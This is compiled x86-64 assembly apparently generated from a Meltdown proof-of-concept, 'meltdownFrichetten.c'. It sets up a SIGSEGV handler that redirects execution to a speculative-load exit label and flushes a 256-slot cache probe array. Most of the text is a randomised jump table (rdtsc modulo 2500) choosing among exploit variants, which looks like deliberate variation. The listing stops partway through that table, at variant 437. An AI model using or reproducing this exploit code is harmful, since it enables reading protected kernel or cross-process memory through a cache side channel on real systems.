	.file	"meltdownFrichetten.c"
	.text
	.type	sigaction_segv, @function
sigaction_segv:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -8(%rbp)
	leaq	__speculative_byte_load_exit(%rip), %rdx
	movq	-8(%rbp), %rax
	movq	%rdx, 168(%rax)
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	sigaction_segv, .-sigaction_segv
	.globl	probe_one
	.type	probe_one, @function
probe_one:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$2424, %rsp
	.cfi_offset 3, -24
	movq	%rdi, -2408(%rbp)
	movq	%rsi, -2416(%rbp)
	movl	%edx, -2420(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$5, -2376(%rbp)
	movl	$0, -2372(%rbp)
	movl	$0, -2384(%rbp)
	movl	$0, -2380(%rbp)
	movb	$0, -2393(%rbp)
	movq	$0, -2360(%rbp)
	leaq	-288(%rbp), %rax
	movl	$256, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2392(%rbp)
	jmp	.L3
.L13:
	leaq	-2336(%rbp), %rax
	movl	$2048, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2388(%rbp)
	jmp	.L4
.L5:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2352(%rbp)
	movq	-2352(%rbp), %rax
#APP
# 106 "meltdownFrichetten.c" 1
	mfence
	clflush	0(%rax)
# 0 "" 2
#NO_APP
	nop
	addl	$1, -2388(%rbp)
.L4:
	cmpl	$255, -2388(%rbp)
	jle	.L5
	movl	$0, %edx
	movl	$0, %esi
	movl	$-1, %edi
	call	read@PLT
	movq	-2408(%rbp), %rdx
	movq	-2416(%rbp), %rcx
#APP
# 158 "meltdownFrichetten.c" 1
	.global __speculative_byte_load_exit 
	92:                              
	xorq	%rax, %rax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$2500, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lprobe_one_win0_var0
	cmpl	$1, %eax
	je	.Lprobe_one_win0_var1
	cmpl	$2, %eax
	je	.Lprobe_one_win0_var2
	cmpl	$3, %eax
	je	.Lprobe_one_win0_var3
	cmpl	$4, %eax
	je	.Lprobe_one_win0_var4
	cmpl	$5, %eax
	je	.Lprobe_one_win0_var5
	cmpl	$6, %eax
	je	.Lprobe_one_win0_var6
	cmpl	$7, %eax
	je	.Lprobe_one_win0_var7
	cmpl	$8, %eax
	je	.Lprobe_one_win0_var8
	cmpl	$9, %eax
	je	.Lprobe_one_win0_var9
	cmpl	$10, %eax
	je	.Lprobe_one_win0_var10
	cmpl	$11, %eax
	je	.Lprobe_one_win0_var11
	cmpl	$12, %eax
	je	.Lprobe_one_win0_var12
	cmpl	$13, %eax
	je	.Lprobe_one_win0_var13
	cmpl	$14, %eax
	je	.Lprobe_one_win0_var14
	cmpl	$15, %eax
	je	.Lprobe_one_win0_var15
	cmpl	$16, %eax
	je	.Lprobe_one_win0_var16
	cmpl	$17, %eax
	je	.Lprobe_one_win0_var17
	cmpl	$18, %eax
	je	.Lprobe_one_win0_var18
	cmpl	$19, %eax
	je	.Lprobe_one_win0_var19
	cmpl	$20, %eax
	je	.Lprobe_one_win0_var20
	cmpl	$21, %eax
	je	.Lprobe_one_win0_var21
	cmpl	$22, %eax
	je	.Lprobe_one_win0_var22
	cmpl	$23, %eax
	je	.Lprobe_one_win0_var23
	cmpl	$24, %eax
	je	.Lprobe_one_win0_var24
	cmpl	$25, %eax
	je	.Lprobe_one_win0_var25
	cmpl	$26, %eax
	je	.Lprobe_one_win0_var26
	cmpl	$27, %eax
	je	.Lprobe_one_win0_var27
	cmpl	$28, %eax
	je	.Lprobe_one_win0_var28
	cmpl	$29, %eax
	je	.Lprobe_one_win0_var29
	cmpl	$30, %eax
	je	.Lprobe_one_win0_var30
	cmpl	$31, %eax
	je	.Lprobe_one_win0_var31
	cmpl	$32, %eax
	je	.Lprobe_one_win0_var32
	cmpl	$33, %eax
	je	.Lprobe_one_win0_var33
	cmpl	$34, %eax
	je	.Lprobe_one_win0_var34
	cmpl	$35, %eax
	je	.Lprobe_one_win0_var35
	cmpl	$36, %eax
	je	.Lprobe_one_win0_var36
	cmpl	$37, %eax
	je	.Lprobe_one_win0_var37
	cmpl	$38, %eax
	je	.Lprobe_one_win0_var38
	cmpl	$39, %eax
	je	.Lprobe_one_win0_var39
	cmpl	$40, %eax
	je	.Lprobe_one_win0_var40
	cmpl	$41, %eax
	je	.Lprobe_one_win0_var41
	cmpl	$42, %eax
	je	.Lprobe_one_win0_var42
	cmpl	$43, %eax
	je	.Lprobe_one_win0_var43
	cmpl	$44, %eax
	je	.Lprobe_one_win0_var44
	cmpl	$45, %eax
	je	.Lprobe_one_win0_var45
	cmpl	$46, %eax
	je	.Lprobe_one_win0_var46
	cmpl	$47, %eax
	je	.Lprobe_one_win0_var47
	cmpl	$48, %eax
	je	.Lprobe_one_win0_var48
	cmpl	$49, %eax
	je	.Lprobe_one_win0_var49
	cmpl	$50, %eax
	je	.Lprobe_one_win0_var50
	cmpl	$51, %eax
	je	.Lprobe_one_win0_var51
	cmpl	$52, %eax
	je	.Lprobe_one_win0_var52
	cmpl	$53, %eax
	je	.Lprobe_one_win0_var53
	cmpl	$54, %eax
	je	.Lprobe_one_win0_var54
	cmpl	$55, %eax
	je	.Lprobe_one_win0_var55
	cmpl	$56, %eax
	je	.Lprobe_one_win0_var56
	cmpl	$57, %eax
	je	.Lprobe_one_win0_var57
	cmpl	$58, %eax
	je	.Lprobe_one_win0_var58
	cmpl	$59, %eax
	je	.Lprobe_one_win0_var59
	cmpl	$60, %eax
	je	.Lprobe_one_win0_var60
	cmpl	$61, %eax
	je	.Lprobe_one_win0_var61
	cmpl	$62, %eax
	je	.Lprobe_one_win0_var62
	cmpl	$63, %eax
	je	.Lprobe_one_win0_var63
	cmpl	$64, %eax
	je	.Lprobe_one_win0_var64
	cmpl	$65, %eax
	je	.Lprobe_one_win0_var65
	cmpl	$66, %eax
	je	.Lprobe_one_win0_var66
	cmpl	$67, %eax
	je	.Lprobe_one_win0_var67
	cmpl	$68, %eax
	je	.Lprobe_one_win0_var68
	cmpl	$69, %eax
	je	.Lprobe_one_win0_var69
	cmpl	$70, %eax
	je	.Lprobe_one_win0_var70
	cmpl	$71, %eax
	je	.Lprobe_one_win0_var71
	cmpl	$72, %eax
	je	.Lprobe_one_win0_var72
	cmpl	$73, %eax
	je	.Lprobe_one_win0_var73
	cmpl	$74, %eax
	je	.Lprobe_one_win0_var74
	cmpl	$75, %eax
	je	.Lprobe_one_win0_var75
	cmpl	$76, %eax
	je	.Lprobe_one_win0_var76
	cmpl	$77, %eax
	je	.Lprobe_one_win0_var77
	cmpl	$78, %eax
	je	.Lprobe_one_win0_var78
	cmpl	$79, %eax
	je	.Lprobe_one_win0_var79
	cmpl	$80, %eax
	je	.Lprobe_one_win0_var80
	cmpl	$81, %eax
	je	.Lprobe_one_win0_var81
	cmpl	$82, %eax
	je	.Lprobe_one_win0_var82
	cmpl	$83, %eax
	je	.Lprobe_one_win0_var83
	cmpl	$84, %eax
	je	.Lprobe_one_win0_var84
	cmpl	$85, %eax
	je	.Lprobe_one_win0_var85
	cmpl	$86, %eax
	je	.Lprobe_one_win0_var86
	cmpl	$87, %eax
	je	.Lprobe_one_win0_var87
	cmpl	$88, %eax
	je	.Lprobe_one_win0_var88
	cmpl	$89, %eax
	je	.Lprobe_one_win0_var89
	cmpl	$90, %eax
	je	.Lprobe_one_win0_var90
	cmpl	$91, %eax
	je	.Lprobe_one_win0_var91
	cmpl	$92, %eax
	je	.Lprobe_one_win0_var92
	cmpl	$93, %eax
	je	.Lprobe_one_win0_var93
	cmpl	$94, %eax
	je	.Lprobe_one_win0_var94
	cmpl	$95, %eax
	je	.Lprobe_one_win0_var95
	cmpl	$96, %eax
	je	.Lprobe_one_win0_var96
	cmpl	$97, %eax
	je	.Lprobe_one_win0_var97
	cmpl	$98, %eax
	je	.Lprobe_one_win0_var98
	cmpl	$99, %eax
	je	.Lprobe_one_win0_var99
	cmpl	$100, %eax
	je	.Lprobe_one_win0_var100
	cmpl	$101, %eax
	je	.Lprobe_one_win0_var101
	cmpl	$102, %eax
	je	.Lprobe_one_win0_var102
	cmpl	$103, %eax
	je	.Lprobe_one_win0_var103
	cmpl	$104, %eax
	je	.Lprobe_one_win0_var104
	cmpl	$105, %eax
	je	.Lprobe_one_win0_var105
	cmpl	$106, %eax
	je	.Lprobe_one_win0_var106
	cmpl	$107, %eax
	je	.Lprobe_one_win0_var107
	cmpl	$108, %eax
	je	.Lprobe_one_win0_var108
	cmpl	$109, %eax
	je	.Lprobe_one_win0_var109
	cmpl	$110, %eax
	je	.Lprobe_one_win0_var110
	cmpl	$111, %eax
	je	.Lprobe_one_win0_var111
	cmpl	$112, %eax
	je	.Lprobe_one_win0_var112
	cmpl	$113, %eax
	je	.Lprobe_one_win0_var113
	cmpl	$114, %eax
	je	.Lprobe_one_win0_var114
	cmpl	$115, %eax
	je	.Lprobe_one_win0_var115
	cmpl	$116, %eax
	je	.Lprobe_one_win0_var116
	cmpl	$117, %eax
	je	.Lprobe_one_win0_var117
	cmpl	$118, %eax
	je	.Lprobe_one_win0_var118
	cmpl	$119, %eax
	je	.Lprobe_one_win0_var119
	cmpl	$120, %eax
	je	.Lprobe_one_win0_var120
	cmpl	$121, %eax
	je	.Lprobe_one_win0_var121
	cmpl	$122, %eax
	je	.Lprobe_one_win0_var122
	cmpl	$123, %eax
	je	.Lprobe_one_win0_var123
	cmpl	$124, %eax
	je	.Lprobe_one_win0_var124
	cmpl	$125, %eax
	je	.Lprobe_one_win0_var125
	cmpl	$126, %eax
	je	.Lprobe_one_win0_var126
	cmpl	$127, %eax
	je	.Lprobe_one_win0_var127
	cmpl	$128, %eax
	je	.Lprobe_one_win0_var128
	cmpl	$129, %eax
	je	.Lprobe_one_win0_var129
	cmpl	$130, %eax
	je	.Lprobe_one_win0_var130
	cmpl	$131, %eax
	je	.Lprobe_one_win0_var131
	cmpl	$132, %eax
	je	.Lprobe_one_win0_var132
	cmpl	$133, %eax
	je	.Lprobe_one_win0_var133
	cmpl	$134, %eax
	je	.Lprobe_one_win0_var134
	cmpl	$135, %eax
	je	.Lprobe_one_win0_var135
	cmpl	$136, %eax
	je	.Lprobe_one_win0_var136
	cmpl	$137, %eax
	je	.Lprobe_one_win0_var137
	cmpl	$138, %eax
	je	.Lprobe_one_win0_var138
	cmpl	$139, %eax
	je	.Lprobe_one_win0_var139
	cmpl	$140, %eax
	je	.Lprobe_one_win0_var140
	cmpl	$141, %eax
	je	.Lprobe_one_win0_var141
	cmpl	$142, %eax
	je	.Lprobe_one_win0_var142
	cmpl	$143, %eax
	je	.Lprobe_one_win0_var143
	cmpl	$144, %eax
	je	.Lprobe_one_win0_var144
	cmpl	$145, %eax
	je	.Lprobe_one_win0_var145
	cmpl	$146, %eax
	je	.Lprobe_one_win0_var146
	cmpl	$147, %eax
	je	.Lprobe_one_win0_var147
	cmpl	$148, %eax
	je	.Lprobe_one_win0_var148
	cmpl	$149, %eax
	je	.Lprobe_one_win0_var149
	cmpl	$150, %eax
	je	.Lprobe_one_win0_var150
	cmpl	$151, %eax
	je	.Lprobe_one_win0_var151
	cmpl	$152, %eax
	je	.Lprobe_one_win0_var152
	cmpl	$153, %eax
	je	.Lprobe_one_win0_var153
	cmpl	$154, %eax
	je	.Lprobe_one_win0_var154
	cmpl	$155, %eax
	je	.Lprobe_one_win0_var155
	cmpl	$156, %eax
	je	.Lprobe_one_win0_var156
	cmpl	$157, %eax
	je	.Lprobe_one_win0_var157
	cmpl	$158, %eax
	je	.Lprobe_one_win0_var158
	cmpl	$159, %eax
	je	.Lprobe_one_win0_var159
	cmpl	$160, %eax
	je	.Lprobe_one_win0_var160
	cmpl	$161, %eax
	je	.Lprobe_one_win0_var161
	cmpl	$162, %eax
	je	.Lprobe_one_win0_var162
	cmpl	$163, %eax
	je	.Lprobe_one_win0_var163
	cmpl	$164, %eax
	je	.Lprobe_one_win0_var164
	cmpl	$165, %eax
	je	.Lprobe_one_win0_var165
	cmpl	$166, %eax
	je	.Lprobe_one_win0_var166
	cmpl	$167, %eax
	je	.Lprobe_one_win0_var167
	cmpl	$168, %eax
	je	.Lprobe_one_win0_var168
	cmpl	$169, %eax
	je	.Lprobe_one_win0_var169
	cmpl	$170, %eax
	je	.Lprobe_one_win0_var170
	cmpl	$171, %eax
	je	.Lprobe_one_win0_var171
	cmpl	$172, %eax
	je	.Lprobe_one_win0_var172
	cmpl	$173, %eax
	je	.Lprobe_one_win0_var173
	cmpl	$174, %eax
	je	.Lprobe_one_win0_var174
	cmpl	$175, %eax
	je	.Lprobe_one_win0_var175
	cmpl	$176, %eax
	je	.Lprobe_one_win0_var176
	cmpl	$177, %eax
	je	.Lprobe_one_win0_var177
	cmpl	$178, %eax
	je	.Lprobe_one_win0_var178
	cmpl	$179, %eax
	je	.Lprobe_one_win0_var179
	cmpl	$180, %eax
	je	.Lprobe_one_win0_var180
	cmpl	$181, %eax
	je	.Lprobe_one_win0_var181
	cmpl	$182, %eax
	je	.Lprobe_one_win0_var182
	cmpl	$183, %eax
	je	.Lprobe_one_win0_var183
	cmpl	$184, %eax
	je	.Lprobe_one_win0_var184
	cmpl	$185, %eax
	je	.Lprobe_one_win0_var185
	cmpl	$186, %eax
	je	.Lprobe_one_win0_var186
	cmpl	$187, %eax
	je	.Lprobe_one_win0_var187
	cmpl	$188, %eax
	je	.Lprobe_one_win0_var188
	cmpl	$189, %eax
	je	.Lprobe_one_win0_var189
	cmpl	$190, %eax
	je	.Lprobe_one_win0_var190
	cmpl	$191, %eax
	je	.Lprobe_one_win0_var191
	cmpl	$192, %eax
	je	.Lprobe_one_win0_var192
	cmpl	$193, %eax
	je	.Lprobe_one_win0_var193
	cmpl	$194, %eax
	je	.Lprobe_one_win0_var194
	cmpl	$195, %eax
	je	.Lprobe_one_win0_var195
	cmpl	$196, %eax
	je	.Lprobe_one_win0_var196
	cmpl	$197, %eax
	je	.Lprobe_one_win0_var197
	cmpl	$198, %eax
	je	.Lprobe_one_win0_var198
	cmpl	$199, %eax
	je	.Lprobe_one_win0_var199
	cmpl	$200, %eax
	je	.Lprobe_one_win0_var200
	cmpl	$201, %eax
	je	.Lprobe_one_win0_var201
	cmpl	$202, %eax
	je	.Lprobe_one_win0_var202
	cmpl	$203, %eax
	je	.Lprobe_one_win0_var203
	cmpl	$204, %eax
	je	.Lprobe_one_win0_var204
	cmpl	$205, %eax
	je	.Lprobe_one_win0_var205
	cmpl	$206, %eax
	je	.Lprobe_one_win0_var206
	cmpl	$207, %eax
	je	.Lprobe_one_win0_var207
	cmpl	$208, %eax
	je	.Lprobe_one_win0_var208
	cmpl	$209, %eax
	je	.Lprobe_one_win0_var209
	cmpl	$210, %eax
	je	.Lprobe_one_win0_var210
	cmpl	$211, %eax
	je	.Lprobe_one_win0_var211
	cmpl	$212, %eax
	je	.Lprobe_one_win0_var212
	cmpl	$213, %eax
	je	.Lprobe_one_win0_var213
	cmpl	$214, %eax
	je	.Lprobe_one_win0_var214
	cmpl	$215, %eax
	je	.Lprobe_one_win0_var215
	cmpl	$216, %eax
	je	.Lprobe_one_win0_var216
	cmpl	$217, %eax
	je	.Lprobe_one_win0_var217
	cmpl	$218, %eax
	je	.Lprobe_one_win0_var218
	cmpl	$219, %eax
	je	.Lprobe_one_win0_var219
	cmpl	$220, %eax
	je	.Lprobe_one_win0_var220
	cmpl	$221, %eax
	je	.Lprobe_one_win0_var221
	cmpl	$222, %eax
	je	.Lprobe_one_win0_var222
	cmpl	$223, %eax
	je	.Lprobe_one_win0_var223
	cmpl	$224, %eax
	je	.Lprobe_one_win0_var224
	cmpl	$225, %eax
	je	.Lprobe_one_win0_var225
	cmpl	$226, %eax
	je	.Lprobe_one_win0_var226
	cmpl	$227, %eax
	je	.Lprobe_one_win0_var227
	cmpl	$228, %eax
	je	.Lprobe_one_win0_var228
	cmpl	$229, %eax
	je	.Lprobe_one_win0_var229
	cmpl	$230, %eax
	je	.Lprobe_one_win0_var230
	cmpl	$231, %eax
	je	.Lprobe_one_win0_var231
	cmpl	$232, %eax
	je	.Lprobe_one_win0_var232
	cmpl	$233, %eax
	je	.Lprobe_one_win0_var233
	cmpl	$234, %eax
	je	.Lprobe_one_win0_var234
	cmpl	$235, %eax
	je	.Lprobe_one_win0_var235
	cmpl	$236, %eax
	je	.Lprobe_one_win0_var236
	cmpl	$237, %eax
	je	.Lprobe_one_win0_var237
	cmpl	$238, %eax
	je	.Lprobe_one_win0_var238
	cmpl	$239, %eax
	je	.Lprobe_one_win0_var239
	cmpl	$240, %eax
	je	.Lprobe_one_win0_var240
	cmpl	$241, %eax
	je	.Lprobe_one_win0_var241
	cmpl	$242, %eax
	je	.Lprobe_one_win0_var242
	cmpl	$243, %eax
	je	.Lprobe_one_win0_var243
	cmpl	$244, %eax
	je	.Lprobe_one_win0_var244
	cmpl	$245, %eax
	je	.Lprobe_one_win0_var245
	cmpl	$246, %eax
	je	.Lprobe_one_win0_var246
	cmpl	$247, %eax
	je	.Lprobe_one_win0_var247
	cmpl	$248, %eax
	je	.Lprobe_one_win0_var248
	cmpl	$249, %eax
	je	.Lprobe_one_win0_var249
	cmpl	$250, %eax
	je	.Lprobe_one_win0_var250
	cmpl	$251, %eax
	je	.Lprobe_one_win0_var251
	cmpl	$252, %eax
	je	.Lprobe_one_win0_var252
	cmpl	$253, %eax
	je	.Lprobe_one_win0_var253
	cmpl	$254, %eax
	je	.Lprobe_one_win0_var254
	cmpl	$255, %eax
	je	.Lprobe_one_win0_var255
	cmpl	$256, %eax
	je	.Lprobe_one_win0_var256
	cmpl	$257, %eax
	je	.Lprobe_one_win0_var257
	cmpl	$258, %eax
	je	.Lprobe_one_win0_var258
	cmpl	$259, %eax
	je	.Lprobe_one_win0_var259
	cmpl	$260, %eax
	je	.Lprobe_one_win0_var260
	cmpl	$261, %eax
	je	.Lprobe_one_win0_var261
	cmpl	$262, %eax
	je	.Lprobe_one_win0_var262
	cmpl	$263, %eax
	je	.Lprobe_one_win0_var263
	cmpl	$264, %eax
	je	.Lprobe_one_win0_var264
	cmpl	$265, %eax
	je	.Lprobe_one_win0_var265
	cmpl	$266, %eax
	je	.Lprobe_one_win0_var266
	cmpl	$267, %eax
	je	.Lprobe_one_win0_var267
	cmpl	$268, %eax
	je	.Lprobe_one_win0_var268
	cmpl	$269, %eax
	je	.Lprobe_one_win0_var269
	cmpl	$270, %eax
	je	.Lprobe_one_win0_var270
	cmpl	$271, %eax
	je	.Lprobe_one_win0_var271
	cmpl	$272, %eax
	je	.Lprobe_one_win0_var272
	cmpl	$273, %eax
	je	.Lprobe_one_win0_var273
	cmpl	$274, %eax
	je	.Lprobe_one_win0_var274
	cmpl	$275, %eax
	je	.Lprobe_one_win0_var275
	cmpl	$276, %eax
	je	.Lprobe_one_win0_var276
	cmpl	$277, %eax
	je	.Lprobe_one_win0_var277
	cmpl	$278, %eax
	je	.Lprobe_one_win0_var278
	cmpl	$279, %eax
	je	.Lprobe_one_win0_var279
	cmpl	$280, %eax
	je	.Lprobe_one_win0_var280
	cmpl	$281, %eax
	je	.Lprobe_one_win0_var281
	cmpl	$282, %eax
	je	.Lprobe_one_win0_var282
	cmpl	$283, %eax
	je	.Lprobe_one_win0_var283
	cmpl	$284, %eax
	je	.Lprobe_one_win0_var284
	cmpl	$285, %eax
	je	.Lprobe_one_win0_var285
	cmpl	$286, %eax
	je	.Lprobe_one_win0_var286
	cmpl	$287, %eax
	je	.Lprobe_one_win0_var287
	cmpl	$288, %eax
	je	.Lprobe_one_win0_var288
	cmpl	$289, %eax
	je	.Lprobe_one_win0_var289
	cmpl	$290, %eax
	je	.Lprobe_one_win0_var290
	cmpl	$291, %eax
	je	.Lprobe_one_win0_var291
	cmpl	$292, %eax
	je	.Lprobe_one_win0_var292
	cmpl	$293, %eax
	je	.Lprobe_one_win0_var293
	cmpl	$294, %eax
	je	.Lprobe_one_win0_var294
	cmpl	$295, %eax
	je	.Lprobe_one_win0_var295
	cmpl	$296, %eax
	je	.Lprobe_one_win0_var296
	cmpl	$297, %eax
	je	.Lprobe_one_win0_var297
	cmpl	$298, %eax
	je	.Lprobe_one_win0_var298
	cmpl	$299, %eax
	je	.Lprobe_one_win0_var299
	cmpl	$300, %eax
	je	.Lprobe_one_win0_var300
	cmpl	$301, %eax
	je	.Lprobe_one_win0_var301
	cmpl	$302, %eax
	je	.Lprobe_one_win0_var302
	cmpl	$303, %eax
	je	.Lprobe_one_win0_var303
	cmpl	$304, %eax
	je	.Lprobe_one_win0_var304
	cmpl	$305, %eax
	je	.Lprobe_one_win0_var305
	cmpl	$306, %eax
	je	.Lprobe_one_win0_var306
	cmpl	$307, %eax
	je	.Lprobe_one_win0_var307
	cmpl	$308, %eax
	je	.Lprobe_one_win0_var308
	cmpl	$309, %eax
	je	.Lprobe_one_win0_var309
	cmpl	$310, %eax
	je	.Lprobe_one_win0_var310
	cmpl	$311, %eax
	je	.Lprobe_one_win0_var311
	cmpl	$312, %eax
	je	.Lprobe_one_win0_var312
	cmpl	$313, %eax
	je	.Lprobe_one_win0_var313
	cmpl	$314, %eax
	je	.Lprobe_one_win0_var314
	cmpl	$315, %eax
	je	.Lprobe_one_win0_var315
	cmpl	$316, %eax
	je	.Lprobe_one_win0_var316
	cmpl	$317, %eax
	je	.Lprobe_one_win0_var317
	cmpl	$318, %eax
	je	.Lprobe_one_win0_var318
	cmpl	$319, %eax
	je	.Lprobe_one_win0_var319
	cmpl	$320, %eax
	je	.Lprobe_one_win0_var320
	cmpl	$321, %eax
	je	.Lprobe_one_win0_var321
	cmpl	$322, %eax
	je	.Lprobe_one_win0_var322
	cmpl	$323, %eax
	je	.Lprobe_one_win0_var323
	cmpl	$324, %eax
	je	.Lprobe_one_win0_var324
	cmpl	$325, %eax
	je	.Lprobe_one_win0_var325
	cmpl	$326, %eax
	je	.Lprobe_one_win0_var326
	cmpl	$327, %eax
	je	.Lprobe_one_win0_var327
	cmpl	$328, %eax
	je	.Lprobe_one_win0_var328
	cmpl	$329, %eax
	je	.Lprobe_one_win0_var329
	cmpl	$330, %eax
	je	.Lprobe_one_win0_var330
	cmpl	$331, %eax
	je	.Lprobe_one_win0_var331
	cmpl	$332, %eax
	je	.Lprobe_one_win0_var332
	cmpl	$333, %eax
	je	.Lprobe_one_win0_var333
	cmpl	$334, %eax
	je	.Lprobe_one_win0_var334
	cmpl	$335, %eax
	je	.Lprobe_one_win0_var335
	cmpl	$336, %eax
	je	.Lprobe_one_win0_var336
	cmpl	$337, %eax
	je	.Lprobe_one_win0_var337
	cmpl	$338, %eax
	je	.Lprobe_one_win0_var338
	cmpl	$339, %eax
	je	.Lprobe_one_win0_var339
	cmpl	$340, %eax
	je	.Lprobe_one_win0_var340
	cmpl	$341, %eax
	je	.Lprobe_one_win0_var341
	cmpl	$342, %eax
	je	.Lprobe_one_win0_var342
	cmpl	$343, %eax
	je	.Lprobe_one_win0_var343
	cmpl	$344, %eax
	je	.Lprobe_one_win0_var344
	cmpl	$345, %eax
	je	.Lprobe_one_win0_var345
	cmpl	$346, %eax
	je	.Lprobe_one_win0_var346
	cmpl	$347, %eax
	je	.Lprobe_one_win0_var347
	cmpl	$348, %eax
	je	.Lprobe_one_win0_var348
	cmpl	$349, %eax
	je	.Lprobe_one_win0_var349
	cmpl	$350, %eax
	je	.Lprobe_one_win0_var350
	cmpl	$351, %eax
	je	.Lprobe_one_win0_var351
	cmpl	$352, %eax
	je	.Lprobe_one_win0_var352
	cmpl	$353, %eax
	je	.Lprobe_one_win0_var353
	cmpl	$354, %eax
	je	.Lprobe_one_win0_var354
	cmpl	$355, %eax
	je	.Lprobe_one_win0_var355
	cmpl	$356, %eax
	je	.Lprobe_one_win0_var356
	cmpl	$357, %eax
	je	.Lprobe_one_win0_var357
	cmpl	$358, %eax
	je	.Lprobe_one_win0_var358
	cmpl	$359, %eax
	je	.Lprobe_one_win0_var359
	cmpl	$360, %eax
	je	.Lprobe_one_win0_var360
	cmpl	$361, %eax
	je	.Lprobe_one_win0_var361
	cmpl	$362, %eax
	je	.Lprobe_one_win0_var362
	cmpl	$363, %eax
	je	.Lprobe_one_win0_var363
	cmpl	$364, %eax
	je	.Lprobe_one_win0_var364
	cmpl	$365, %eax
	je	.Lprobe_one_win0_var365
	cmpl	$366, %eax
	je	.Lprobe_one_win0_var366
	cmpl	$367, %eax
	je	.Lprobe_one_win0_var367
	cmpl	$368, %eax
	je	.Lprobe_one_win0_var368
	cmpl	$369, %eax
	je	.Lprobe_one_win0_var369
	cmpl	$370, %eax
	je	.Lprobe_one_win0_var370
	cmpl	$371, %eax
	je	.Lprobe_one_win0_var371
	cmpl	$372, %eax
	je	.Lprobe_one_win0_var372
	cmpl	$373, %eax
	je	.Lprobe_one_win0_var373
	cmpl	$374, %eax
	je	.Lprobe_one_win0_var374
	cmpl	$375, %eax
	je	.Lprobe_one_win0_var375
	cmpl	$376, %eax
	je	.Lprobe_one_win0_var376
	cmpl	$377, %eax
	je	.Lprobe_one_win0_var377
	cmpl	$378, %eax
	je	.Lprobe_one_win0_var378
	cmpl	$379, %eax
	je	.Lprobe_one_win0_var379
	cmpl	$380, %eax
	je	.Lprobe_one_win0_var380
	cmpl	$381, %eax
	je	.Lprobe_one_win0_var381
	cmpl	$382, %eax
	je	.Lprobe_one_win0_var382
	cmpl	$383, %eax
	je	.Lprobe_one_win0_var383
	cmpl	$384, %eax
	je	.Lprobe_one_win0_var384
	cmpl	$385, %eax
	je	.Lprobe_one_win0_var385
	cmpl	$386, %eax
	je	.Lprobe_one_win0_var386
	cmpl	$387, %eax
	je	.Lprobe_one_win0_var387
	cmpl	$388, %eax
	je	.Lprobe_one_win0_var388
	cmpl	$389, %eax
	je	.Lprobe_one_win0_var389
	cmpl	$390, %eax
	je	.Lprobe_one_win0_var390
	cmpl	$391, %eax
	je	.Lprobe_one_win0_var391
	cmpl	$392, %eax
	je	.Lprobe_one_win0_var392
	cmpl	$393, %eax
	je	.Lprobe_one_win0_var393
	cmpl	$394, %eax
	je	.Lprobe_one_win0_var394
	cmpl	$395, %eax
	je	.Lprobe_one_win0_var395
	cmpl	$396, %eax
	je	.Lprobe_one_win0_var396
	cmpl	$397, %eax
	je	.Lprobe_one_win0_var397
	cmpl	$398, %eax
	je	.Lprobe_one_win0_var398
	cmpl	$399, %eax
	je	.Lprobe_one_win0_var399
	cmpl	$400, %eax
	je	.Lprobe_one_win0_var400
	cmpl	$401, %eax
	je	.Lprobe_one_win0_var401
	cmpl	$402, %eax
	je	.Lprobe_one_win0_var402
	cmpl	$403, %eax
	je	.Lprobe_one_win0_var403
	cmpl	$404, %eax
	je	.Lprobe_one_win0_var404
	cmpl	$405, %eax
	je	.Lprobe_one_win0_var405
	cmpl	$406, %eax
	je	.Lprobe_one_win0_var406
	cmpl	$407, %eax
	je	.Lprobe_one_win0_var407
	cmpl	$408, %eax
	je	.Lprobe_one_win0_var408
	cmpl	$409, %eax
	je	.Lprobe_one_win0_var409
	cmpl	$410, %eax
	je	.Lprobe_one_win0_var410
	cmpl	$411, %eax
	je	.Lprobe_one_win0_var411
	cmpl	$412, %eax
	je	.Lprobe_one_win0_var412
	cmpl	$413, %eax
	je	.Lprobe_one_win0_var413
	cmpl	$414, %eax
	je	.Lprobe_one_win0_var414
	cmpl	$415, %eax
	je	.Lprobe_one_win0_var415
	cmpl	$416, %eax
	je	.Lprobe_one_win0_var416
	cmpl	$417, %eax
	je	.Lprobe_one_win0_var417
	cmpl	$418, %eax
	je	.Lprobe_one_win0_var418
	cmpl	$419, %eax
	je	.Lprobe_one_win0_var419
	cmpl	$420, %eax
	je	.Lprobe_one_win0_var420
	cmpl	$421, %eax
	je	.Lprobe_one_win0_var421
	cmpl	$422, %eax
	je	.Lprobe_one_win0_var422
	cmpl	$423, %eax
	je	.Lprobe_one_win0_var423
	cmpl	$424, %eax
	je	.Lprobe_one_win0_var424
	cmpl	$425, %eax
	je	.Lprobe_one_win0_var425
	cmpl	$426, %eax
	je	.Lprobe_one_win0_var426
	cmpl	$427, %eax
	je	.Lprobe_one_win0_var427
	cmpl	$428, %eax
	je	.Lprobe_one_win0_var428
	cmpl	$429, %eax
	je	.Lprobe_one_win0_var429
	cmpl	$430, %eax
	je	.Lprobe_one_win0_var430
	cmpl	$431, %eax
	je	.Lprobe_one_win0_var431
	cmpl	$432, %eax
	je	.Lprobe_one_win0_var432
	cmpl	$433, %eax
	je	.Lprobe_one_win0_var433
	cmpl	$434, %eax
	je	.Lprobe_one_win0_var434
	cmpl	$435, %eax
	je	.Lprobe_one_win0_var435
	cmpl	$436, %eax
	je	.Lprobe_one_win0_var436
	cmpl	$437, %eax
	je	.Lprobe_one_win0_var437
